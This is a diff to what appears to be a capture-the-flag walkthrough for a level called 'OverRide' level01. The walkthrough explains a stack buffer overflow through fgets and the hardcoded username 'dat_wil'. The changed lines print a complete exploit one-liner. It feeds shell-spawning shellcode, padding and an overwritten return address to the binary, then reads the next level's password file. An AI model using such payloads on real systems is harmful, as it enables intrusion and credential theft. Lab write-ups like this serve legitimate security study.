@@ -9,18 +9,14 @@ Buffer Overflow
 The program takes user input for username and password.
 Two buffer overflow vulnerabilities exist: one for each fgets call.
 The second overflow is critical, allowing us to overwrite the return address.
-Trigger the overflow after entering the correct username ("dat_wil").
-Exploit by redirecting execution to a jmp esp gadget in the libc.
-Use a payload structure: [SHELLCODE (28 bytes)] + ['B' * 52] + [JMP ESP gadget addr] + [SUB ESP,0x54; JMP ESP].
-Manually exploit the program or automate it using Python and pwn library.
+We need to enter the correct username "dat_wil".
+The shellcode is injected in the username buffer.
+We replace the old eip with the address of the shellcode with the help of a buffer overflow in the password buffer.
 
 ## Payload:
 
-Contains shellcode for spawning a shell.
-Padding, jmp esp gadget address, and stack pointer adjustment instructions are included.
-
 ```sh
-python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"' > /tmp/payload1
+level01@OverRide:~$ ./level01 < <(python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; echo "cat /home/users/level02/.pass")
 
 ```
 
